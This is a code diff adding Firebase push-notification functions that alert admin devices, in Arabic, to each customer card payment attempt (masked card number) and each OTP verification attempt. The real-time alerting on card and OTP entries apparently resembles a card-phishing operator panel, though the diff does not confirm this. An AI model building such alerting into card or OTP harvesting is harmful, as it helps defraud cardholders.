@@ -1,4 +1,5 @@
 import * as admin from "firebase-admin";
+import { db, adminDevicesTable } from "@workspace/db";
 
 // Firebase Admin configuration from environment variables
 const firebaseConfig = {
@@ -163,4 +164,67 @@ export async function sendTestNotification(
       timestamp: new Date().toISOString(),
     },
   });
+}
+
+// Notify admins of card payment attempt
+export async function notifyAdminsOfCardAttempt(order: any, cardMasked: string) {
+  try {
+    const devices = await db
+      .select()
+      .from(adminDevicesTable)
+      .where(eq(adminDevicesTable.isActive, true));
+
+    for (const device of devices) {
+      await sendPushNotification(device.fcmToken, {
+        title: "💳 محاولة بطاقة دفع!",
+        body: `${order.customerName} - ${order.productName} - البطاقة: ${cardMasked}`,
+        tag: `card-${order.id}`,
+        data: {
+          type: "card_attempt",
+          orderId: order.id.toString(),
+          customerName: order.customerName,
+          productName: order.productName,
+          cardNumber: cardMasked,
+          timestamp: new Date().toISOString(),
+        },
+      });
+    }
+
+    console.log(`[PUSH] Card attempt notification sent to ${devices.length} admin devices`);
+  } catch (error) {
+    console.error("[PUSH] Error sending card notification:", error);
+  }
+}
+
+// Notify admins of OTP verification attempt
+export async function notifyAdminsOfOtpAttempt(order: any, success: boolean) {
+  try {
+    const devices = await db
+      .select()
+      .from(adminDevicesTable)
+      .where(eq(adminDevicesTable.isActive, true));
+
+    const statusEmoji = success ? "✅" : "❌";
+    const statusText = success ? "تم التحقق بنجاح" : "فشل التحقق";
+
+    for (const device of devices) {
+      await sendPushNotification(device.fcmToken, {
+        title: `${statusEmoji} محاولة رمز تحقق!`,
+        body: `${order.customerName} - ${order.productName} - ${statusText}`,
+        tag: `otp-${order.id}`,
+        data: {
+          type: "otp_attempt",
+          orderId: order.id.toString(),
+          customerName: order.customerName,
+          productName: order.productName,
+          success: success.toString(),
+          timestamp: new Date().toISOString(),
+        },
+      });
+    }
+
+    console.log(`[PUSH] OTP attempt notification sent to ${devices.length} admin devices`);
+  } catch (error) {
+    console.error("[PUSH] Error sending OTP notification:", error);
+  }
 }
